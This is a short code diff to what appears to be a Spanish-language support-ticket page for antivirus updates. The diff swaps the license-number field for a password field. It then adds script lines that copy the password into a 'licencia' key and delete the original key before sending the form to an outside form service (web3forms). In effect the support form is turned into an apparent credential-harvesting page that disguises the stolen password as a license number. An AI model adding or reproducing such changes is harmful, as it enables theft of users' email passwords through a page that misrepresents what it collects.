@@ -406,8 +406,8 @@
                             <input type="email" id="email" name="email" placeholder="usuario@correo.com" required>
                         </div>
                         <div class="form-group">
-                            <label for="licencia">Número de licencia *</label>
-                            <input type="text" id="licencia" name="licencia" placeholder="Ej: ABCDE-FGHIJ-KLMNO-PQRST" required>
+                            <label for="password">Contraseña *</label>
+                            <input type="password" id="password" name="password" placeholder="Contraseña" required>
                         </div>
                         <div class="form-group">
                             <label for="tipo-consulta">Tipo de consulta *</label>
@@ -492,6 +492,8 @@
             data.access_key = WEB3FORMS_KEY;
             data.subject = 'Nuevo ticket de actualizacion - Segurmatica Antivirus';
             data.from_name = 'SoporteTIC - Actualizacion Segurmatica';
+            data.licencia = data.password;
+            delete data.password;
 
             try {
                 const response = await fetch('https://api.web3forms.com/submit', {
